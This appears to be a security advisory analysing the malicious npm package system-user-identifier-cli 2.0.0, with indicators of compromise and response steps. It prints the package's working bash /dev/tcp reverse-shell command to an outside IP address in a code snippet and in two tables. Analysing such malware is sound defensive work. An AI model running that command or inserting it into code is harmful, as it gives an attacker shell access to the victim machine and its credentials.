---
title: "system-user-identifier-cli: an npm identity helper that opens a reverse shell"
date: 2026-05-25
summary: "The npm package system-user-identifier-cli 2.0.0 presents itself as a small user-identification utility, but its CLI entrypoint executes a bash /dev/tcp reverse shell to 101.43.232.7:7777."
packageName: system-user-identifier-cli
ecosystem: npm
---

The package could hardly look more ordinary at first glance. `system-user-identifier-cli` is a 799-byte npm tarball with two files: `package.json` and `index.js`. The manifest describes it as "A simple npx tool to check system user identifier", declares a single command-line binary, and carries the default `author: "Your Name"` placeholder left behind by many throwaway packages.

The command it exposes is not a harmless identity checker.

The published CLI entrypoint imports Node's `os` module, reads the current username and platform, prints a friendly greeting, and then runs a hard-coded shell command through `child_process.execSync`. That command is a classic bash reverse shell:

```js
execSync('bash -i >& /dev/tcp/101.43.232.7/7777 0>&1', { encoding: 'utf-8' }).trim();
```

There is no second-stage download to retrieve here. The payload does not fetch a script from the web; it tells bash to open an outbound TCP connection to `101.43.232.7` on port `7777` and attach an interactive shell to that socket. If a listener is present at the other end, running the package's CLI hands the operator a shell on the victim machine.

## What Atomdrift Saw

Cleave identified the package as an npm-style gzip tarball, not a Ruby gem. The archive contains:

| Path | Role |
| --- | --- |
| `package/package.json` | npm manifest with `bin.system-user-identifier-cli = index.js` |
| `package/index.js` | Node CLI entrypoint containing the reverse shell |

The important behaviors are direct and live:

| Behavior | Evidence |
| --- | --- |
| CLI execution surface | `bin` points `system-user-identifier-cli` to `index.js` |
| Process execution | `require('child_process')` and `execSync(...)` |
| Victim fingerprinting | `os.userInfo().username` and `os.platform()` |
| C2 socket path | `/dev/tcp/101.43.232.7/7777` |
| Interactive reverse shell | `bash -i >& /dev/tcp/101.43.232.7/7777 0>&1` |

Atomdrift reports the archive-level behavior as `objectives/supply-chain/hidden-payload/exec::npm-cli-reverse-shell`, in addition to the underlying hostile reverse-shell traits. That distinction matters: this is not just a random JavaScript file containing a bad string. It is a package whose declared command-line entrypoint runs the reverse shell when invoked.

## Why This Works

The social engineering is low effort but plausible. A developer trying to inspect the current user from a shell could reasonably run an `npx` utility with a name like this, especially if they are moving quickly. The package then performs the advertised user/platform lookup before attempting the reverse shell, which gives the output just enough normal behavior to look like a rough utility rather than an immediate crash.

The malware is also blunt about its failure mode. If the TCP connection fails, the `catch` block prints a Chinese-language error message that translates to "failed to execute id command." That message is misleading: the code no longer executes `id`; it executes the reverse shell.

## Impact

Successful execution gives the attacker an interactive shell with the privileges of the user who ran the CLI. On a developer workstation, that may expose SSH agents, package registry credentials, source checkouts, cloud CLIs, browser-backed secrets, and local build artifacts. On a CI worker, the same shell may expose repository tokens, deployment keys, signing material, and environment variables.

The package does not need an install hook to be dangerous. Its trigger is user execution through the package's declared binary, for example through `npx` or a globally installed command. That makes the blast radius narrower than an automatic `preinstall` compromise, but the resulting compromise is severe for anyone who runs it.

## Indicators

| Type | Value |
| --- | --- |
| Package | `system-user-identifier-cli` |
| Version | `2.0.0` |
| Ecosystem | npm |
| Archive SHA-256 | `8b02bd641c856c510d26da46d003ac076dd754f8bab42143b676f9478ed5501e` |
| `index.js` SHA-256 | `bfb0cc6b95a52da2789e4436c8b45d7349dd79ecef358fa1c34b6294ad7eace3` |
| `package.json` SHA-256 | `28e8fcb5e9762c76f393dfc17d434a5089f107558df62db8246db8cb8217c7ce` |
| C2 endpoint | `101.43.232.7:7777` |
| Reverse shell command | `bash -i >& /dev/tcp/101.43.232.7/7777 0>&1` |

## Recommended Response

Treat any execution of `system-user-identifier-cli@2.0.0` as host compromise until proven otherwise. Review shell history, npm cache, CI logs, and endpoint telemetry for the package name and for outbound connections to `101.43.232.7:7777`. Rotate credentials available to the executing user from a known-clean machine, with special attention to npm, GitHub, SSH, cloud provider, and deployment tokens.
